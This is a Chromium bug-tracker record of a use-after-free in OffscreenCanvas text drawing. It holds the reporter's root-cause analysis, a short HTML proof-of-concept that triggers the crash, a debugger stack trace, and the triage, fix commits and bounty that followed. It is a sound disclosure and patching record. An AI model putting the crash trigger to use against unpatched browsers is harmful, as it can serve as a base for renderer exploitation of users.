# Security: OffscreenCanvas - Use After Free in OffscreenCanvasRenderingContext2D::DrawTextInternal()

| Field | Value |
|-------|-------|
| **Issue ID** | [40052984](https://issues.chromium.org/issues/40052984) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>Canvas |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | yi...@chromium.org |
| **Created** | 2020-07-31 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

Specifically crafted HTML file with OffscreenCanvas can cause Use After Free of a MemoryManagedPaintCanvas object in OffscreenCanvasRenderingContext2D::DrawTextInternal(). This bug may be exploited to achieve one click remote code execution in renderer process.

```
In OffscreenCanvasRenderingContext2D::DrawTextInternal(), the pointer to the PaintCanvas object is copied at the beginning of the function:  

	cc::PaintCanvas\* paint_canvas = GetOrCreatePaintCanvas();      
  
Then various funcitons are called to do the text drawing. At the end of the function, the paint_canvas pointer is used again:  
  
	paint_canvas->restoreToCount(save_count);	  
  
Unfortunately, the underlying PaintCanvas (MemoryManagedPaintCanvas) object may be freed between the obove two statements if certain conditions are met.  It renders paint_canvas a dangling pointer and thus a corrupted instruction pointer address is executed instead.    
  
Among other operations between these 2 statements, BaseRenderingContext2D::Draw() is called. If the Skia blend mode is kSrc, the canvas would be cleared:  

	void BaseRenderingContext2D::Draw() {  
	...  
	  } else if (GetState().GlobalComposite() == SkBlendMode::kSrc) {  
		ClearCanvas();  // takes care of checkOverdraw()  
  
If the Skia blend mode is kSrc and there are draw ops ( CanvasResourceProvider::HasRecordedDrawOps() ) , function ClearCanvas() not only clears the canvas, but also free the existing canvas object:  
  
	BaseRenderingContext2D::ClearCanvas()  
	  BaseRenderingContext2D::CheckOverdraw()  
	    OffscreenCanvasRenderingContext2D::WillOverwriteCanvas()  
		  CanvasResourceProvider::SkipQueuedDrawCommands()  
		    PaintRecorder::finishRecordingAsPicture()  
			canvas_.reset();  
  
The deletion of the canvas object happens in PaintRecorder::finishRecordingAsPicture():  
  
	sk_sp<PaintRecord> PaintRecorder::finishRecordingAsPicture() {  
	...  

	  // Some users (e.g. printing) use the existence of the recording canvas  
	  // to know if recording is finished, so reset it here.  
	  canvas_.reset();  
	    
Skia blend mode kSrc corresponds to Blink composite kCompositeCopy, so in the PoC (UAF_DrawTextInternal_PoC.html), I set the globalCompositeOperation propery of the 2d rendering context to "copy".  
  
I also attached an ASAN report (UAF_DrawTextInternal_ASAN.txt) generated from a local ASAN build for your easy assessment.  

```

**VERSION**  

Google Chrome 86.0.4214.3 (Official Build) dev (64-bit) (cohort: Dev-nonPGO)  

Revision f7ba3d0d9086396f66b5b5ca37037c620d54db2e-refs/branch-heads/4214@{#7}  

OS Windows 10 OS Version 1909 (Build 18363.959)  

JavaScript V8 8.6.238

**REPRODUCTION CASE** (UAF\_DrawTextInternal\_PoC.html)  

<script>  

var workerCode = 'var offscreenCanvas0 = new OffscreenCanvas(100, 100); \n';  

workerCode += 'var ctx = offscreenCanvas0.getContext("2d");\n';  

workerCode += 'ctx.globalCompositeOperation = "copy";\n';  

workerCode += 'ctx.rect(10, 10, 150, 100);ctx.fill("evenodd");\n';  

workerCode += 'ctx.lineTo( 1,1 );ctx.fillText("", 1,1);\n';  

var blob = new Blob([workerCode],{type: "text/javascript"});  

var worker1 = new Worker(window.URL.createObjectURL(blob));  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(b44.2320): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
00007602`18000500 ??              ???  
11:018> r  
rax=0000028981b488e0 rbx=00006825f56e2d08 rcx=0000028981a5b060  
rdx=0000000000000002 rsi=00006825f56e3880 rdi=0000000000000000  
rip=0000760218000500 rsp=000000f8e99fe398 rbp=00007ffb14bf3b40  
 r8=0000000000000064  r9=0000000000000064 r10=0000000000000000  
r11=0000000000000000 r12=0000000000000002 r13=00006825f56e2d88  
r14=00006825f56e39a8 r15=0000028981a5b060  
iopl=0         nv up ei pl nz na po nc  
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010204  
00007602`18000500 ??              ???  
11:018> k  
 # Child-SP          RetAddr           Call Site  
00 000000f8`e99fe398 00007ffb`12f67228 0x00007602`18000500  
01 000000f8`e99fe3a0 00007ffb`12f66834 chrome!blink::OffscreenCanvasRenderingContext2D::DrawTextInternal+0x9ec [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\canvas\offscreencanvas2d\offscreen_canvas_rendering_context_2d.cc @ 588]   
02 000000f8`e99fe640 00007ffb`133ab3e6 chrome!blink::OffscreenCanvasRenderingContext2D::fillText+0x1a [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\canvas\offscreencanvas2d\offscreen_canvas_rendering_context_2d.cc @ 474]   
03 (Inline Function) --------`-------- chrome!blink::offscreen_canvas_rendering_context_2d_v8_internal::FillTextMethod+0x2aa [c:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\modules\v8\v8_offscreen_canvas_rendering_context_2d.cc @ 1663]   
04 000000f8`e99fe680 00007ffb`0e98c31b chrome!blink::V8OffscreenCanvasRenderingContext2D::FillTextMethodCallback+0x2e6 [c:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\modules\v8\v8_offscreen_canvas_rendering_context_2d.cc @ 3026]   
05 000000f8`e99fe7f0 00007ffb`0e98b798 chrome!v8::internal::FunctionCallbackArguments::Call+0x25b [c:\b\s\w\ir\cache\builder\src\v8\src\api\api-arguments-inl.h @ 159]   
06 000000f8`e99fe920 00007ffb`0e98aca6 chrome!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>+0x2e8 [c:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc @ 113]   
07 000000f8`e99fea30 00007ffb`0e98a8c7 chrome!v8::internal::Builtin_Impl_HandleApiCall+0x146 [c:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc @ 145]   
08 000000f8`e99feb00 00007ffb`0f313e7c chrome!v8::internal::Builtin_HandleApiCall+0x47 [c:\b\s\w\ir\cache\builder\src\v8\src\builtins\builtins-api.cc @ 129]   
09 000000f8`e99feb60 00007ffb`0f2a7195 chrome!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3c  
0a 000000f8`e99febb8 00007ffb`0f2a4c7e chrome!Builtins_InterpreterEntryTrampoline+0xd5  
0b 000000f8`e99fec60 00007ffb`0f2a486c chrome!Builtins_JSEntryTrampoline+0x5e  
0c 000000f8`e99fec88 00007ffb`0ea4edd1 chrome!Builtins_JSEntry+0xcc  
0d (Inline Function) --------`-------- chrome!v8::internal::GeneratedCode<unsigned long long,unsigned long long,unsigned long long,unsigned long long,unsigned long long,long long,unsigned long long \*\*>::Call+0x18 [c:\b\s\w\ir\cache\builder\src\v8\src\execution\simulator.h @ 142]   
0e 000000f8`e99feda0 00007ffb`0ea4e14a chrome!v8::internal::`anonymous namespace'::Invoke+0xc61 [c:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc @ 368]   
0f 000000f8`e99fef60 00007ffb`0e930883 chrome!v8::internal::Execution::Call+0x10a [c:\b\s\w\ir\cache\builder\src\v8\src\execution\execution.cc @ 462]   
10 000000f8`e99ff010 00007ffb`10ccc092 chrome!v8::Script::Run+0x253 [c:\b\s\w\ir\cache\builder\src\v8\src\api\api.cc @ 2128]   
11 000000f8`e99ff180 00007ffb`1259709b chrome!blink::V8ScriptRunner::RunCompiledScript+0x412 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\v8_script_runner.cc @ 358]   
12 000000f8`e99ff2e0 00007ffb`12597558 chrome!blink::WorkerOrWorkletScriptController::EvaluateInternal+0x14b [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\worker_or_worklet_script_controller.cc @ 375]   
13 000000f8`e99ff4a0 00007ffb`125a4072 chrome!blink::WorkerOrWorkletScriptController::Evaluate+0x98 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\bindings\core\v8\worker_or_worklet_script_controller.cc @ 415]   
14 000000f8`e99ff5c0 00007ffb`11785d13 chrome!blink::ClassicScript::RunScriptOnWorker+0x92 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\script\classic_script.cc @ 42]   
15 000000f8`e99ff620 00007ffb`11785b32 chrome!blink::WorkerGlobalScope::RunWorkerScript+0x63 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\workers\worker_global_scope.cc @ 450]   
16 (Inline Function) --------`-------- chrome!blink::WorkerGlobalScope::WorkerScriptFetchFinished+0x48 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\workers\worker_global_scope.cc @ 413]   
17 000000f8`e99ff660 00007ffb`125a0935 chrome!blink::WorkerGlobalScope::EvaluateClassicScript+0x172 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\workers\worker_global_scope.cc @ 398]   
18 000000f8`e99ff7f0 00007ffb`125a2fa9 chrome!blink::WorkerThread::EvaluateClassicScriptOnWorkerThread+0x65 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\workers\worker_thread.cc @ 634]   
19 (Inline Function) --------`-------- chrome!base::internal::FunctorTraits<void (blink::WorkerThread::\*)(const blink::KURL &, WTF::String, std::__1::unique_ptr<WTF::Vector<unsigned char,0,WTF::PartitionAllocator>,std::__1::default_delete<WTF::Vector<unsigned char,0,WTF::PartitionAllocator> > >, const v8_inspector::V8StackTraceId &),void>::Invoke+0x3c [c:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 498]   
1a (Inline Function) --------`-------- chrome!base::internal::InvokeHelper<0,void>::MakeItSo+0x44 [c:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 637]   
1b (Inline Function) --------`-------- chrome!base::internal::Invoker<base::internal::BindState<void (blink::WorkerThread::\*)(const blink::KURL &, WTF::String, std::__1::unique_ptr<WTF::Vector<unsigned char,0,WTF::PartitionAllocator>,std::__1::default_delete<WTF::Vector<unsigned char,0,WTF::PartitionAllocator> > >, const v8_inspector::V8StackTraceId &),WTF::CrossThreadUnretainedWrapper<blink::WorkerThread>,blink::KURL,WTF::String,WTF::PassedWrapper<std::__1::unique_ptr<WTF::Vector<unsigned char,0,WTF::PartitionAllocator>,std::__1::default_delete<WTF::Vector<unsigned char,0,WTF::PartitionAllocator> > > >,v8_inspector::V8StackTraceId>,void ()>::RunImpl+0x56 [c:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 710]   
1c 000000f8`e99ff850 00007ffb`0cf05970 chrome!base::internal::Invoker<base::internal::BindState<void (blink::WorkerThread::\*)(const blink::KURL &, WTF::String, std::__1::unique_ptr<WTF::Vector<unsigned char,0,WTF::PartitionAllocator>,std::__1::default_delete<WTF::Vector<unsigned char,0,WTF::PartitionAllocator> > >, const v8_inspector::V8StackTraceId &),WTF::CrossThreadUnretainedWrapper<blink::WorkerThread>,blink::KURL,WTF::String,WTF::PassedWrapper<std::__1::unique_ptr<WTF::Vector<unsigned char,0,WTF::PartitionAllocator>,std::__1::default_delete<WTF::Vector<unsigned char,0,WTF::PartitionAllocator> > > >,v8_inspector::V8StackTraceId>,void ()>::RunOnce+0x69 [c:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 679]   
1d (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0x12 [c:\b\s\w\ir\cache\builder\src\base\callback.h @ 99]   
1e 000000f8`e99ff8a0 00007ffb`1022ce47 chrome!base::TaskAnnotator::RunTask+0x130 [c:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc @ 142]   
1f 000000f8`e99ff9b0 00007ffb`1022cb96 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x167 [c:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 334]   
20 000000f8`e99ffb10 00007ffb`0cf0376c chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x96 [c:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 255]   
21 000000f8`e99ffb90 00007ffb`0cf0367e chrome!base::MessagePumpDefault::Run+0x7c [c:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc @ 41]   
22 000000f8`e99ffc10 00007ffb`0cf030ca chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0xce [c:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 460]   
23 000000f8`e99ffc70 00007ffb`0f50d914 chrome!base::RunLoop::Run+0x1aa [c:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 126]   
24 000000f8`e99ffd10 00007ffb`0f901f3d chrome!blink::scheduler::WorkerThread::SimpleThreadImpl::Run+0x1a4 [c:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc @ 170]   
25 000000f8`e99ffdb0 00007ffb`805c7bd4 chrome!base::`anonymous namespace'::ThreadFunc+0xbd [c:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc @ 114]   
26 000000f8`e99ffe30 00007ffb`8256ce51 KERNEL32!BaseThreadInitThunk+0x14  
27 000000f8`e99ffe60 00000000`00000000 ntdll!RtlUserThreadStart+0x21  

```

## Attachments

- [UAF_DrawTextInternal_PoC.html](attachments/UAF_DrawTextInternal_PoC.html) (text/plain, 473 B)
- [UAF_DrawTextInternal_ASAN.txt](attachments/UAF_DrawTextInternal_ASAN.txt) (text/plain, 23.9 KB)

## Timeline

### cl...@chromium.org (2020-07-31)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5639286866640896.

### rs...@chromium.org (2020-07-31)

Thanks for the high-quality report!

I'm letting Clusterfuzz work out the full version impact here, but I'll circle back if it hasn't, but senorblanco@, can you take a look at this?

[Monorail components: Blink>Canvas]

### cl...@chromium.org (2020-08-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-08-01)

Detailed Report: https://clusterfuzz.com/testcase?key=5639286866640896

Fuzzer: 
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x62100001e100
Crash State:
  blink::OffscreenCanvasRenderingContext2D::DrawTextInternal
  blink::FillTextOperationCallback
  v8::internal::FunctionCallbackArguments::Call
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=748855:748861

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5639286866640896

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5639286866640896 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2020-08-01)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>JavaScript]

### [Deleted User] (2020-08-01)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-08-01)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2020-08-02)

Looks like da2f4d182015d2c48cb508ce5ec485afc129b6f5 (OffscreenCanvas: Don't copy previous content if canvas is fully repaint).

### rs...@chromium.org (2020-08-03)

[Empty comment from Monorail migration]

[Monorail components: -Blink>JavaScript]

### yi...@chromium.org (2020-08-13)

[Empty comment from Monorail migration]

### yi...@chromium.org (2020-08-14)

Thank you for the detailed bug report and analysis! It's really helpful!
I am working on this bug now.

### yi...@chromium.org (2020-08-18)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### yi...@chromium.org (2020-08-26)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/15c4ec7c0cc6197c5b0cbaf0d05d6fb9a667e358

commit 15c4ec7c0cc6197c5b0cbaf0d05d6fb9a667e358
Author: yiyix <yiyix@chromium.org>
Date: Fri Aug 28 03:49:08 2020

Use a resource after Free in OffscreenCanvasRC::DrawTextInternal()

In OffscreenCanvasRenderingContext::DrawTextInternal(), |paint_canvas|
can be freed in the draw command in BaseRenderingContext. We then use
the |paint_canvas| causes the security bug that we are using a resource
after it's freed.

Looking at how |paint_canvas| is used in the method DrawTextInternal(),
restore a cleared |paint_canvas| is not really necessary. So I removed
it's only restored if the canvas is not cleared (i.e. canvas is not
freed).

Bug: 1111737
Change-Id: I699b855434f7ddfbc678d2a9cfe25fe4938a798a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2358574
Commit-Queue: Yi Xu <yiyix@chromium.org>
Reviewed-by: Fernando Serboncini <fserb@chromium.org>
Reviewed-by: Aaron Krajeski <aaronhk@chromium.org>
Cr-Commit-Position: refs/heads/master@{#802508}

[modify] https://crrev.com/15c4ec7c0cc6197c5b0cbaf0d05d6fb9a667e358/third_party/blink/renderer/modules/canvas/offscreencanvas2d/offscreen_canvas_rendering_context_2d.cc
[add] https://crrev.com/15c4ec7c0cc6197c5b0cbaf0d05d6fb9a667e358/third_party/blink/web_tests/fast/canvas/OffscreenCanvas-drawText.html


### ad...@google.com (2020-08-31)

yiyix@ do you consider this fixed? If so please mark the bug as Fixed. Sheriffbot will then prompt to merge this back to M85 and M86. We'll want to know about any stability risks before deciding whether to merge this: to me, the fix looks straightforward and safe to merge. Do you agree?

### ad...@google.com (2020-08-31)

[Empty comment from Monorail migration]

### yi...@chromium.org (2020-09-01)

yes i consider this fixed and safe to merge. 

### yi...@chromium.org (2020-09-01)

[Empty comment from Monorail migration]

### yi...@chromium.org (2020-09-01)

Add merge request for M85 as well. Looking at the schedule, https://chromiumdash.appspot.com/schedule, M85 will be releasing today, Sept 1. It would be good to add to M85 if there is an another release for m85.

### [Deleted User] (2020-09-01)

This bug requires manual review: Request affecting a post-stable build
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), dgagnon@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2020-09-01)

Approving merge to M85, branch 4183, and M86, branch 4240, assuming no problems have appeared in Canary.

### [Deleted User] (2020-09-01)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-09-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/393e2c2632da6436b1d5d8bdb52e14654fc004c2

commit 393e2c2632da6436b1d5d8bdb52e14654fc004c2
Author: yiyix <yiyix@chromium.org>
Date: Tue Sep 01 20:29:42 2020

Use a resource after Free in OffscreenCanvasRC::DrawTextInternal()

In OffscreenCanvasRenderingContext::DrawTextInternal(), |paint_canvas|
can be freed in the draw command in BaseRenderingContext. We then use
the |paint_canvas| causes the security bug that we are using a resource
after it's freed.

Looking at how |paint_canvas| is used in the method DrawTextInternal(),
restore a cleared |paint_canvas| is not really necessary. So I removed
it's only restored if the canvas is not cleared (i.e. canvas is not
freed).

Bug: 1111737

TBR=fserb@chromium.org

(cherry picked from commit 15c4ec7c0cc6197c5b0cbaf0d05d6fb9a667e358)

Change-Id: I699b855434f7ddfbc678d2a9cfe25fe4938a798a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2358574
Commit-Queue: Yi Xu <yiyix@chromium.org>
Reviewed-by: Fernando Serboncini <fserb@chromium.org>
Reviewed-by: Aaron Krajeski <aaronhk@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#802508}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2388264
Reviewed-by: Yi Xu <yiyix@chromium.org>
Cr-Commit-Position: refs/branch-heads/4183@{#1732}
Cr-Branched-From: 740e9e8a40505392ba5c8e022a8024b3d018ca65-refs/heads/master@{#782793}

[modify] https://crrev.com/393e2c2632da6436b1d5d8bdb52e14654fc004c2/third_party/blink/renderer/modules/canvas/offscreencanvas2d/offscreen_canvas_rendering_context_2d.cc
[add] https://crrev.com/393e2c2632da6436b1d5d8bdb52e14654fc004c2/third_party/blink/web_tests/fast/canvas/OffscreenCanvas-drawText.html


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-09-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/cbb40308c8db1ba48b21e50834e2a9b772200ba2

commit cbb40308c8db1ba48b21e50834e2a9b772200ba2
Author: yiyix <yiyix@chromium.org>
Date: Tue Sep 01 21:50:21 2020

Use a resource after Free in OffscreenCanvasRC::DrawTextInternal()

In OffscreenCanvasRenderingContext::DrawTextInternal(), |paint_canvas|
can be freed in the draw command in BaseRenderingContext. We then use
the |paint_canvas| causes the security bug that we are using a resource
after it's freed.

Looking at how |paint_canvas| is used in the method DrawTextInternal(),
restore a cleared |paint_canvas| is not really necessary. So I removed
it's only restored if the canvas is not cleared (i.e. canvas is not
freed).

Bug: 1111737
TBR=fserb@chromium.org

(cherry picked from commit 15c4ec7c0cc6197c5b0cbaf0d05d6fb9a667e358)

Change-Id: I699b855434f7ddfbc678d2a9cfe25fe4938a798a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2358574
Commit-Queue: Yi Xu <yiyix@chromium.org>
Reviewed-by: Fernando Serboncini <fserb@chromium.org>
Reviewed-by: Aaron Krajeski <aaronhk@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#802508}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2388560
Reviewed-by: Yi Xu <yiyix@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#352}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/cbb40308c8db1ba48b21e50834e2a9b772200ba2/third_party/blink/renderer/modules/canvas/offscreencanvas2d/offscreen_canvas_rendering_context_2d.cc
[add] https://crrev.com/cbb40308c8db1ba48b21e50834e2a9b772200ba2/third_party/blink/web_tests/fast/canvas/OffscreenCanvas-drawText.html


### cl...@chromium.org (2020-09-03)

ClusterFuzz testcase 5639286866640896 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=802507:802508

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### ad...@google.com (2020-09-05)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-05)

[Empty comment from Monorail migration]

### lo...@gmail.com (2020-09-05)

Thanks team for the fix.
Can someone add a reward-topanel label so it can be reviewed for bounty consideration? Thanks.

### ad...@chromium.org (2020-09-06)

That should happen automatically next week. If it doesn't, please let me know in a week!

### ad...@google.com (2020-09-08)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-09-08)

yiyix@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### ad...@google.com (2020-09-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-09-09)

Congratulations! The VRP panel has decided to award $7,500 for this bug.

### ad...@google.com (2020-09-10)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1111737?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052984)*
